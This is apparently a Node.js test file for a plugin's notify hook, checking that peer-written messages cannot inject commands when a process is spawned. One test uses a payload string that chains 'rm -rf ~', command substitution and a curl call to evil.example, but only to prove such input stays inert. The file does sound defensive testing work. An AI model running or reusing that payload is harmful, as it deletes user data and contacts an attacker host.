/**
 * The delivery hook — how a turn-based client gets woken.
 *
 * The tests that matter most here are the refusals. A notify hook is the one
 * place in this plugin where peer-written content comes near a process
 * launch, so the shape of the API is the security control: fixed argv, no
 * shell, content in the environment.
 */
import test from 'node:test'
import assert from 'node:assert/strict'

import { createDeliveryHook } from '../src/hook.js'

/** Records what would have been spawned, without spawning anything. */
const recorder = () => {
  const calls = []
  const spawnFn = (file, args, options) => {
    calls.push({ file, args, options })
    return { on() {}, unref() {} }
  }
  return { calls, spawnFn }
}

test('no configured command means no hook at all', () => {
  const hook = createDeliveryHook({})
  assert.equal(hook.enabled, false)
  assert.doesNotThrow(() => hook.notify({ from: 'codex', text: 'hi' }))
})

test('a configured command runs on delivery', () => {
  const { calls, spawnFn } = recorder()
  const hook = createDeliveryHook({ command: ['node', 'notify.mjs'], spawnFn })
  hook.notify({ from: 'codex', to: 'claude', seq: 4, text: 'wake up' })
  assert.equal(calls.length, 1)
  assert.equal(calls[0].file, 'node')
  assert.deepEqual(calls[0].args, ['notify.mjs'])
})

test('the message travels in the environment, never on the command line', () => {
  // This is the whole security design: nothing a peer writes is ever parsed
  // as a command by anything.
  const { calls, spawnFn } = recorder()
  const hook = createDeliveryHook({ command: ['notify.sh'], spawnFn })
  hook.notify({ from: 'codex', to: 'claude', seq: 7, text: 'hello there' })
  assert.deepEqual(calls[0].args, [], 'no message content in argv')
  assert.equal(calls[0].options.env.MAILBOX_TEXT, 'hello there')
  assert.equal(calls[0].options.env.MAILBOX_FROM, 'codex')
  assert.equal(calls[0].options.env.MAILBOX_SEQ, '7')
})

test('the hook never runs through a shell', () => {
  // With shell: true, argv is re-parsed and any metacharacter a peer wrote
  // becomes syntax.
  const { calls, spawnFn } = recorder()
  createDeliveryHook({ command: ['notify.sh'], spawnFn }).notify({ text: 'x' })
  assert.equal(calls[0].options.shell, false)
})

test('shell metacharacters in a message are inert', () => {
  const { calls, spawnFn } = recorder()
  const hook = createDeliveryHook({ command: ['notify.sh'], spawnFn })
  const nasty = '"; rm -rf ~; #  $(whoami)  `id`  && curl evil.example'
  hook.notify({ from: 'codex', text: nasty })
  // It arrives verbatim as data, and appears nowhere that is executed.
  assert.equal(calls[0].options.env.MAILBOX_TEXT, nasty)
  assert.deepEqual(calls[0].args, [])
  assert.equal(calls[0].file, 'notify.sh')
})

test('a command given as a string is refused', () => {
  // Accepting one would mean splitting it, and splitting is exactly where
  // quoting bugs become injection.
  assert.throws(() => createDeliveryHook({ command: 'notify.sh "$MSG"' }), /array of strings/i)
})

test('a command with non-string parts is refused', () => {
  assert.throws(() => createDeliveryHook({ command: ['node', 42] }), /array of strings/i)
  assert.throws(() => createDeliveryHook({ command: [] }), /array of strings/i)
})

test('environment values are bounded', () => {
  const { calls, spawnFn } = recorder()
  createDeliveryHook({ command: ['n'], spawnFn }).notify({ text: 'x'.repeat(20000) })
  assert.ok(calls[0].options.env.MAILBOX_TEXT.length <= 4000, 'a doorbell is not a delivery van')
})

test('a hook that cannot start does not break delivery', () => {
  // The message is already durably stored by the time this runs. A doorbell
  // that breaks the door is worse than no doorbell.
  const logged = []
  const hook = createDeliveryHook({
    command: ['does-not-exist'],
    spawnFn: () => { throw new Error('ENOENT') },
    logger: { error: (m) => logged.push(m) }
  })
  assert.doesNotThrow(() => hook.notify({ text: 'still delivered' }))
  assert.ok(logged.some((m) => /could not start/i.test(m)))
})

test('a child error is handled rather than crashing the host', () => {
  // An unhandled 'error' event on a child process is an uncaught exception.
  const logged = []
  let handler
  const hook = createDeliveryHook({
    command: ['n'],
    spawnFn: () => ({ on(event, fn) { if (event === 'error') handler = fn }, unref() {} }),
    logger: { error: (m) => logged.push(m) }
  })
  hook.notify({ text: 'x' })
  assert.equal(typeof handler, 'function', 'an error handler must be attached')
  handler(new Error('spawn failed'))
  assert.ok(logged.some((m) => /notify hook failed/i.test(m)))
})

test('missing message fields do not throw', () => {
  const { calls, spawnFn } = recorder()
  assert.doesNotThrow(() => createDeliveryHook({ command: ['n'], spawnFn }).notify())
  assert.equal(calls[0].options.env.MAILBOX_FROM, '')
})
